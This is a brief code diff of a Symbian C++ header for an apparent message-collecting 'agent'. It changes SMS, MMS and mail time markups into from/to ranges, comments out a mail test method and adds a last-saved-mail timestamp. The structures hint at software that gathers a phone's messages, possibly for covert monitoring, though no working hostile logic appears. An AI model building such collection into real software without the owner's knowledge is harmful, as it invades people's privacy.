@@ -67,10 +67,11 @@ typedef struct TMAPISerializedMessageHeader {
 
 typedef struct TMarkup 
 	{
-	TTime smsMarkup;
-	TTime mmsMarkup;
-	TTime mailMarkup;
+	TTime smsFrom, smsTo;
+	TTime mmsFrom, mmsTo;
+	TTime mailFrom, mailTo;
 	} TMarkup;
+
 
 typedef struct TAgentClassFilter {
 	TBool iHistory;
@@ -181,7 +182,7 @@ private:
 	void ConstructL(const TDesC8& params);
 
 	//TODO: delete this method when finished mail test
-	void WriteMailFile(const TDesC8& aData);
+	//void WriteMailFile(const TDesC8& aData);
 	
 private:
 	CMsvSession* iMsvSession;			
@@ -217,6 +218,8 @@ private:
 	TInt iMailboxesCounter;
 	TInt iMessagesCounter;
 	TBool iMailDump;
+	
+	TTime iLastSavedMail;
 	
 	__FLOG_DECLARATION_MEMBER
 	};
